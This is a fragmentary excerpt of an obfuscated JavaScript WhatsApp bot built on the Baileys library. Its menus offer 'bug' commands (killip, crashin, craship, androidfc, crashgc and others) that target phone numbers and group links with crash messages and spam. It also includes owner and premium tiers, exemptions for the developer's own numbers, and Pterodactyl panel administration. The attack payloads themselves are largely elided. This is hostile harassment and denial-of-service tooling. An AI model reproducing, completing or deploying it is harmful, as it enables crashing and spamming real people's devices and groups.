...
function _0x3eba() {
    const _0xa79fa4 = ['bugemoji', ' Hari, ', 'sound61', 'Link Invalid!', 'sound64', 'sound142', 'UPI', 'bomgc', 'sound36', 'charAt', 'sound71', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', 'stringify', 'fromObject', 'floor', 'leave', 'GET', 'sound35', ' Detik', 'groupmenu', '@g.us', 'sound46', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*BUG ANDROID*\x0a\x0a*X-NUMBER*\x0a🥀 264XXXXX\x0a🍁 263XXXXX\x0a🐉 263XXXXX\x0a🍒 263XXXXX\x0a🌷 263XXXXX\x0a\x0a*X-SPAM*\x0a🌹 <amount>\x0a>🐲 <amount>\x0a🔥 <amount>\x0a🦖 <amount>\x0a🦕 <amount>\x0a\x0a _*© 𝗦𝗔𝗠✓𝗣𝗛𝗔𝗡𝗧𝗢𝗠*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'unwatchFile', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*BUG IPHONE*\x0a> killip 263XXXX\x0a> bomip 263XXXX\x0a> travass 263XXXX\x0a> crashin 263XXXX\x0a> homeip 263XXXX\x0a> blankip 263XXXX\x0a> craship 264XXXX\x0a> gas_ip 263XXXX\x0a> docip 263XXXX\x0a\x0a  _*© 𝗞𝗜𝗡𝗡𝗚✓𝗠𝗔𝗟𝗩𝗜𝗡*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', './db/premium.json', '\x0aCREATED AT: \x0a', 'listjadibot', 'pagination', '- From :', 'cpanelmenu', 'magenta', 'Fitur Ini Hanya Dapat Digunakan Oleh Admin!', 'sound154', 'util', 'SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸', '\x0aUSERNAME: ', 'block', 'sound37', 'key_pltc', 'pushName', 'templateButtonReplyMessage', 'sound14', './config', 'NativeFlowMessage', 'sound102', 'imageMessage', '*Bugs Are Being Processed...*', 'Unlimited %', 'fromMe', 'sound65', '\x0a▬▭▬▭▬▭▬▭▬▭▬▭\x0a', 'splice', 'àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®', 'iphonefc', ' close', '268pqcHgf', 'selectedButtonId', 'total_pages', '\x0aADMIN: ', '\x0aPASSWORD: ', 'devNumber', '*This feature can only be used by the owner/Dev*', 'addusr', '1hit', 'sound45', 'selectedId', 'sound6', 'CHANGED_IN_CHAT', '/api/client/servers/', 'sound129', 'reinstall', '263780934873', 'lec-i', 'videoMessage', '/api/application/users?page=', 'sound134', 'key_plta', 'sound57', ' Menit, ', 'sound160', '*We are processing your request.*', 'sound50', '*⭔Number* : @', 'sound52', 'contextInfo', ' https://chat.whatsapp.com/xxxx\x0a\x0a_*Note:*_ If you want to send a large number of bugs, please type as follows\x0a\x0aEx: .', '*ENTER THE PAIRING CODE BELOW*\x0a*TO BE A TEMPORARY BOT ✓*\x0a\x0a1. Click the three dots in the top right corner\x0a2. Tap the linked device\x0a3. Tap link device\x0a4. Tap link with phone number only\x0a5. Enter the pairing code below\x0a\x0a*Code Pairing :* `', '7114yluTnU', 'sound118', 'sound54', 'sound22', 'Bearer ', ' In the Users owners database*', 'Make me An Admin in other to execute the Command!', 'stopjadibot', 'create', './lib/jadibot', 'VIP', 'sound34', 'limits', 'sound26', 'bugandroid', 'global_search_new_chat', 'sound158', '0@s.whatsapp.net', '▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\x0a', 'writeFileSync', 'buggc', 'unblock', '*⭔UserID* : ', 'groupParticipantsUpdate', 'updateBlockStatus', ' To the Premium Users Database*', 'ghcr.io/parkervcp/yolks:nodejs_21', 'detsrv', 'sound33', '24799203DpckHW', 'groupMetadata', 'documentMessage', 'sound88', 'sound48', 'sound112', 'Goodbye🖐', 'status@broadcast', 'ownerName', ', With The Amount Of Spam 10*', 'anjay', 'map', 'toUpperCase', '/unsuspend', 'yellow', 'rm -r database/jadibot/', '.mp3', '*MODE DESCRIPTION GROUP*\x0a\x0a*_Open : all members can edit group description_*\x0a\x0a*_Close: only group admins can edit description*\x0a\x0a*Example:*\x0a', '*Succesfully 💯 Send Bug-ADN To @', 'homeip', 'cache', 'addsrv', 'sound161', 'Enter Group Link!\x0aEx: .join https://chat.whatsapp.com/xxxx', 'memory', 'sound1', 'delsrv', '؂ن؃؄ٽ؂ن؃؄ٽ', 'This Feature Can Only Be Used Within Groups!', '/api/application/users', '/api/application/servers/', 'There are no users yetJadibot', 'username, description,userID,ram/disk,cpu', 'FBPAY', 'xforce', 'killip', '4392524570816732', '@buyer.id', 'cta_url', 'Auto_ReadPesan', 'addapi', 'includes', 'sound104', 'sound12', 'docip', ' linkgc jumlahbug\x0a\x0aContoh:\x0a.', 'Users', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*GROUP MENU*\x0a> kick\x0a> open\x0a> close\x0a> linkgc\x0a> linkgrup\x0a> revoke\x0a> hidetag\x0a> promote\x0a> demote\x0a> setname\x0a> setdesc\x0a> editinfo\x0a\x0a _*©𝗞𝗜𝗡𝗡𝗚✓𝗠𝗔𝗟𝗩𝗜𝗡*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'travagc', ' MB\x0aCPU: ', 'lol', '\x0aLANGUAGE: ', 'sound114', './servers/logo.jpg', 'sound109', 'groupAcceptInvite', 'sound85', 'extendedTextMessage', '*Success Added @', 'Update ', 'username', 'remove', 'sound90', '_The Number Has Become an Owner  !!_', 'This feature can only be used by the owner', '35ijGsGU', 'bugandro', 'sound8', ' 263XXXX', 'Auto_Recording', 'sound127', 'root_admin', 'sound16', '\x0a● DISK: ', '8633344THAnrH', 'doca', 'sound38', 'Use ', '*Khusus Owner Leccy!*', 'Footer', 'sound122', ' https://chat.whatsapp.com/xxxx 10\x0a\x0a©𝗞𝗜𝗡𝗡𝗚✓𝗠𝗔𝗟𝗩𝗜𝗡', 'sound91', 'exports', '/api/application/servers?page=', '1120020DvxLYT', '*FORMAT ADDUSR*:\x0a.addusr 263XXXX,leccy', '𝕾𝖙𝖗𝖆𝖛𝖆𝕺𝖋𝖈', '%\x0aEXPIRED: 1 BULAN\x0aDESCRIPTION: ', 'language', ', With The Amount Of Spam 25*', 'match', 'user', 'shift', 'cyan', '*Successfully Activated Self Mode!*', 'trim', 'composing', '\x0aNumber : @', 'last_name', 'buggroup', 'count', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*CPANEL MENU*\x0a> listapi\x0a> addapi\x0a> delusr\x0a> detusr\x0a> listusr\x0a> addusr\x0a> listsrv\x0a> detsrv\x0a> delsrv\x0a> addsrv\x0a> bbansrv\x0a> unbansrv\x0a> reinstall\x0a\x0a _*© 𝗞𝗜𝗡𝗡𝗚✓𝗠𝗔𝗟𝗩𝗜𝗡*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'sound86', 'promote', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*OWNER MENU*\x0a> join\x0a> restart\x0a> leave\x0a> unblock\x0a> block\x0a> shutdown\x0a> unmute\x0a> mute\x0a> runtime\x0a\x0a _*© 𝗞𝗜𝗡𝗡𝗚✓𝗠𝗔𝗟𝗩𝗜𝗡*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'message', 'sound73', '*Succesfully Send ', '_Failed to Delete From Database, Number is Not Owners Bot!!_', 'push', '/reinstall', '3989322VHljrn', 'locked', 'sound98', 'application/json', 'domain', '263780934873@s.whatsapp.net', '*Congratulations users, you can now use owners features*', 'Body', 'wargc', 'subject', '_*LIST USER PREMIUM*_\x0a*Total User :* ', '*\x0aOwners : *', '_Enter A Valid And Registered Number On WhatsApp!!_', 'Jumlah Numbers are required!!!', ' number\x0aExample ', 'sound149', 'POST', 'crashgc', 'then', 'sound76', '/api/application/users/', 'sound74', '*Sorry, You Are Not Registered Jadibot!*', '*The number is not registered in the WhatsApp application.*', '\x0aNAME: ', ', With The Amount Of Spam 20*', 'meta', ' 263XXXXX', '/resources', ' Jam, ', '\x0a● MEMORY: ', 'log', 'description', 'white', 'ê¦¾', 'sound40', 'groupUpdateSubject', 'sound43', 'onWhatsApp', 'readMessages', '/api/client/account/api-keys', 'sound30', '*succesfully restart session ✓*', 'key', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*BUG CRASH-INFINITY*\x0a\x0a*X-ANDROID*\x0a> androidfc 263XXXX,5\x0a> bugandro 263XXXX,5\x0a> fcwa 263XXXX,5\x0a> doca 263XXXX,5\x0a> lec-a 263XXXX,5\x0a> kill_adn 263XXXX,5\x0a\x0a*X-IPHONE*\x0a> bugipong 263XXXX,5\x0a> iphonefc 263XXXX,5\x0a> fcwi 263XXXX,5\x0a> doci 263XXXX,5\x0a> lec-i 263XXXX,5\x0a> kill_ipn 263XXXX,5\x0a\x0a _*© 𝗞𝗜𝗡𝗡𝗚✓𝗠𝗔𝗟𝗩𝗜𝗡*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0aBotname : *', '*SUKSES DELETE USER ', 'sound15', '▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬\x0a*LIST USERS PANEL*\x0a□ Nama Host : ', 'redBright', 'virdokgc', 'Unlimited MB', '2037630TKbEKT', '*\x0aNumber : @', '@whiskeysockets/baileys', ' MB\x0aDISK: ', '\x0aEXPIRED: 1 BULAN\x0aCREATED AT: \x0a', 'buginfinity', '\x0a\x0a*SEND ACCOUNT* @', 'audio/mp3', 'sound82', 'buttonsResponseMessage', 'kill_ipn', 'selectedRowId', 'node-fetch', 'test', 'bugipong', 'join', '- Message :', 'slice', 'murbugmenu', 'repeat', 'ID where is it?', 'greenBright', '*Sorry, That Number is Not Registered Jadibot!*', 'sound51', 'sound44', 'Bye Everyone.', 'DEFAULT', 'CHAT_SETTING', 'json', 'sound24', 'trolifc', 'sound103', 'created_at', '/suspend', 'uptime', 'ownermenu', 'Type_Menu', 'nama_host', 'parse', 'caption', 'eggID', 'sound28', '\x0aTYPE: ', 'data', 'sound151', 'sound21', 'remoteJid', 'participant', 'sound63', '\x0aCREATED AT: \x0a ', '\x0a□ Page : ', 'recording', 'toLowerCase', 'soundmenu', 'sound148', '263780934873', 'sound11', '*succesfully delete session* @', 'Reply the target!', '@s.whatsapp.net', 'parse-ms', 'sound27', 'sound62', '\x0a● DESCRIPTION: ', 'sound159', '\x0aPrefix : *MULTI*\x0a▭▬▭▬▭▬▭▬▭▬▭▬\x0a*===( LIST-MENU )=====*\x0a> jadibotmenu\x0a> ownermenu\x0a> groupmenu\x0a> murbugmenu\x0a> cpanelmenu\x0a> soundmenu\x0a▭▬▭▬▭▬▭▬▭▬▭▬\x0a*===( BUG-MENU )=====*\x0a> buginfinity\x0a> bugemoji\x0a> buggroup\x0a> bugiphone\x0a> bugandroid\x0a▭▬▭▬▭▬▭▬▭▬▭▬\x0a_*CREDITS © 𝗞𝗜𝗡𝗡𝗚✓𝗠𝗔𝗟𝗩𝗜𝗡*_\x0a*POWERED BY @', 'unlimited', 'sound69', '\x0a▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬', ', With The Amount Of Spam ', 'blankip', ' 263XXXX,1', 'bugiphone', 'linkgc', '️𝗛𝗘𝗥𝗘 𝗔𝗥𝗘 𝗬𝗢𝗨𝗥 𝗣𝗔𝗡𝗘𝗟 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 𝗕𝗥𝗢𝗦𝗞𝗜\x0a\x0aID: ', 'sound147', 'Teks description Nya Mana?\x0a\x0aEx:\x0a.setdesc teks_deskripsi', 'sound68', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*JADIBOT MENU*\x0a> jadibot\x0a> stopjadibot\x0a> del-sesi\x0a> resetjadibot\x0a> listjadibot\x0a\x0a _*© 𝗞𝗜𝗡𝗡𝗚✓𝗠𝗔𝗟𝗩𝗜𝗡*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'sound7', ' To @', 'npm', 'sound130', '*Succesfully Send Pairing Code* @', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*MURBUG MENU*\x0a> listown\x0a> addown\x0a> delown\x0a> addprem\x0a> delprem\x0a> listprem\x0a\x0a _*©𝗞𝗜𝗡𝗡𝗚✓𝗠𝗔𝗟𝗩𝗜𝗡*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'green', 'bansrv', 'bgBlack', 'androidfc', ' In the Users Premium database*', 'sound143', 'menu', 'fcwi', '𝕾𝖙𝖗𝖆𝖛𝖆-𝕭𝖚𝖌', 'sound141', 'jadibotmenu', 'InteractiveMessage', 'name', 'sound84', 'sound53', 'sound150', 'editinfo', 'exit', 'setname', 'gaslec', 'indexOf', 'messageContextInfo', 'sound117', 'SUKSES DELETE SERVER ', 'sound97', '𝕾𝖙𝖗𝖆𝖛𝖆 𝕭𝖚𝖌', 'travas', 'sound93', '*mohon maaf* @', 'revoke', 'conversation', 'unmute', 'sound139', 'sound42', '𝖘𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', 'VVIP', 'filter', 'kill_adn', '*Succesfully Send Bug-IOS To @', 'sound72', 'crashfc', 'sound113', '*Format :*\x0a', 'sound20', 'whatsapp.com', 'crashin', 'length', '{ display_text : \'𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌\', url : , merchant_url :  }', 'audio/mp4', 'infinity', 'https://chat.whatsapp.com/', 'quotedMessage', 'sound120', 'sound94', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*SOUND MENU*\x0a> sound1\x0a> sound2\x0a> sound3\x0a> sound4\x0a> sound5\x0a> sound6\x0a> sound7\x0a> sound8\x0a> sound9\x0a> sound10\x0a> sound11\x0a> sound12\x0a> sound13\x0a> sound14\x0a> sound15\x0a> sound16\x0a> sound17\x0a> sound18\x0a> sound19\x0a> sound20\x0a\x0a _*©𝗞𝗜𝗡𝗡𝗚✓𝗠𝗔𝗟𝗩𝗜𝗡*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'lec-a', 'replace', 'npm start', 'sound32', '🌶️', '1859572RInooz', 'relayMessage', '*The bot has been in self mode before*', ' USER DETAILS\x0a\x0aID: ', 'sound67', 'resetjadibot', 'current_page', 'sound126', 'email', '\x0a ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬', 'open', '{ display_text : \" \", url : , merchant_url : \" \"}', 'sound121', 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½', 'sound47', 'sendPresenceUpdate', 'sendTextWithMentions', 'sound18', 'not_announcement', 'hidetag', 'sound75', 'sound123', 'sound140', 'setsubject', 'addprem', 'listusr', '1234567890', './lib/myfunc.js', ' SERVER DETAILS\x0a\x0a● ID: ', '▭▬▭▬▭▬▭▬▭▬▭▬▭\x0a*BUG GROUP*\x0a> wargc *linkgrup*\x0a> xlecgc *linkgrup*\x0a> buggc *linkgrup*\x0a> crashgc *linkgrup*\x0a> bomgc *linkgrup*\x0a> travagc *linkgrup*\x0a> virdokgc *linkgrup*\x0a\x0a _*©𝗞𝗜𝗡𝗡𝗚✓𝗠𝗔𝗟𝗩𝗜𝗡*_\x0a▭▬▭▬▭▬▭▬▭▬▭▬▭', 'sendMessage', 'locID', '*Deleting Success @', '\x0a□ Total Server : ', 'botName', 'DELETE', '*there are not Premium Users in the database*', 'sound5', 'sound9', '\x0a▬▭▬▭▬▭▬▭▬▭▬▭▬\x0a', 'sound156', 'close', 'split', 'bomip', 'sound157', 'readFileSync', 'listprem', 'sound81', 'participants', '/api/application/nests/5/eggs/', '`\x0a\x0a*Note:*\x0a_Code can expire at any time._\x0a_If the code is an error, please type_ ⇩\x0a\x0a========[  !stopjadibot  ]========', 'sound124', 'sound10', '\x0a===========================================\x0a', 'sound152', 'sound39', '\x0aEMAIL: ', ',ram/disk,cpu', 'listsrv', './database/jadibot/', 'whatsapp', 'sound4', '𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕', '*succesfully delete session ✓*', 'black', 'singleSelectReply', 'kick', 'sound49', 'attributes', 'errors', 'runtime', 'sound99', 'listapi', 'Maaf This feature can only be used by the owner sedsatan', ' ^_^\x0a*session users still registered.*\x0a\x0a*please type* .stopjadibot\x0ato delete session ✓*', 'catch', './db/owners.json', '*OPENED* The group is opened by admin\x0aNow members can send messages', '\x0a\x0acara upload script strava\x0ake panel and how to  install\x0anode modules manual:\x0ahttps://shorturl.at/HkUQE\x0a\x0a*NOTE*\x0aPlease Login Panel Account After \x0a1Minutes Created/Sent From Bot\x0a', 'resolve', 'cpu', 'Server what number do you want to delete??\x0aContoh: delsrv 1', '\x0aMEMORY: ', 'Jumlah mandatory number!!', 'sound101', 'https://github.com/Lexxy24/MusicTikTok-Api/raw/master/tiktokmusic/', 'now', 'text', 'sound87', 'sound137', 'doci', 'format', 'sound96', '𝗠𝗬 𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗕𝗘\x0a\x0aID: ', 'endsWith', 'sound95', 'sound116', '\x0a□ Total Users : ', 'sound83', 'gas_ip', 'sound92', 'detail', 'chalk', 'fcwa', 'watchFile', 'sound131', 'groupSettingUpdate', '1679959486', 'Message', 'existsSync', 'disk', 'sound25', 'listResponseMessage', 'INITIATED_BY_ME', 'sound136', 'Users : ', 'sound107', 'detusr', 'mute', 'sound145', 'sound106', 'unbansrv', 'This feature can only be used by the owner Bot', 'addown', 'sound17', 'codepairing'];
    _0x3eba = function () {
        return _0xa79fa4;
    };
    return _0x3eba();
...
mute_bot = ![], module[_0x296d57(0x265)] = async (_0x23b255, _0x38267e, _0x59b581) => {
    ...
    try {
        ...
        case _0x1b775d(0x1fc):
            ...
            break;
        case 'del-sesi': {
            if (!q) return _0x25b16a('EX: .d-sesi 263XXXX');
        ...
        case _0x1b775d(0x1b8):
            ...
            break;
        case 'jadibot': {
            if (!q) return _0x25b16a('EX: .jadibot 263XXXX');
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x252));
        ...
        case _0x1b775d(0x137): {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb) return;
            if (!_0x3bedf8[0x0]) return _0x25b16a('Use ' + (_0x185059 + _0x2818bf) + _0x1b775d(0x290) + (_0x185059 + _0x2818bf) + ' 263XXXXX');
        ...
        case 'delprem': {
            ...
            if (!premium[_0x1b775d(0x23b)](ya)) return _0x25b16a('_Failed to Delete From Database, The Number Is Not Users Premium!!_');
        ...
        case _0x1b775d(0x11e): {
            ...
            if (!galakujiku) return _0x25b16a(_0x1b775d(0x10d) + (_0x185059 + _0x2818bf) + ' 263XXXX');
        ...
        case '🦕': {
            ...
            if (_0x42fa35 == '263780934873@s.whatsapp.net') return;
        ...
        case 'craship': {
            ...
            if (galakujiku == '923070051625') return;
            if (galakujiku == '923070051625') return;
        ...
        case 'santet': {
            ...
            if (galakujiku == global['devNumber'][_0x1b775d(0x23b)]) return;
            if (galakujiku == _0x1b775d(0x1e5)) return;
            if (galakujiku == '263780934873') return;
        ...
        case _0x1b775d(0x1a4): {
            if (!_0x585723 && !_0x5290c9 && !_0x3424fb) return;
            if (!q) return _0x25b16a('*HOW TO SEND GROUP BUG*\x0a\x0a' + (_0x185059 + _0x2818bf) + _0x1b775d(0x1f3) + _0x2818bf + _0x1b775d(0x23f) + _0x2818bf + _0x1b775d(0x263));
            _0x4159f4('⏳');
        ...
        case _0x1b775d(0x30e): {
            ...
            if (meluatke == '263780934873') return;
        ...
        case _0x1b775d(0x161):
            ...
            _0x25b16a('Group Trash Successfully Removed!'), remove = _0x38267e['message'][_0x1b775d(0x24b)][_0x1b775d(0x1f2)]['participant'], await _0x23b255[_0x1b775d(0x20c)](_0x42fa35, [remove], _0x1b775d(0x24f));
            break;
        case _0x1b775d(0x132): {
            if (!_0x4ae346) return _0x25b16a('This Feature Can Only Be Used Within Groups!');
            if (!_0xa7e0c0 && !_0x585723) return _0x25b16a(_0x1b775d(0x1bd));
            let _0x1151e4 = [];
        ...
        case 'setdesk': {
            if (!_0x4ae346) return _0x25b16a(_0x1b775d(0x22e));
            if (!_0xa7e0c0 && !_0x585723) return _0x25b16a(_0x1b775d(0x1bd));
            if (!_0xcf285e) return _0x25b16a('This Feature Can Only Be Used After The Bot Becomes Admin!');
        ...
        case _0x1b775d(0x1dc): {
            ...
            _0x49d796('𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 𝗣𝗔𝗡𝗘𝗟 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗\x0a\x0aID: ' + _0x4ae208['id'] + _0x1b775d(0x2e0) + _0x1a56b7['object'] + _0x1b775d(0x1c1) + _0x4ae208[_0x1b775d(0x24e)] + '\x0aEMAIL: ' + _0x4ae208['email'] + '\x0aNAME: ' + _0x4ae208['first_name'] + ' ' + _0x4ae208[_0x1b775d(0x275)] + _0x1b775d(0x245) + _0x4ae208[_0x1b775d(0x26b)] + '\x0aADMIN: ' + _0x4ae208[_0x1b775d(0x259)] + _0x1b775d(0x1b7) + _0x4ae208[_0x1b775d(0x2d6)] + _0x1b775d(0x2bc) + _0x4d027c[_0x1b775d(0x149)]('@')[0x0], [_0x4d027c]);
        }
        break;
        case 'delusr': {
            if (!_0x585723) return _0x25b16a(_0x1b775d(0x1db));
        ...
        case _0x1b775d(0x1e4): {
            ...
            _0x25b16a('*SUCCESSFUL REINSTALL SERVER ' + q + '*');
        }
        break;
        case _0x1b775d(0x30c): {
            ...
            _0x25b16a('*SUCCESSFUL BANNED SERVER ' + q + '*');
        }
        break;
        case _0x1b775d(0x198): {
            ...
            _0x25b16a('*SUCCESSFUL UNBAND SERVER ' + _0x58f5a4 + '*');
        }
        break;
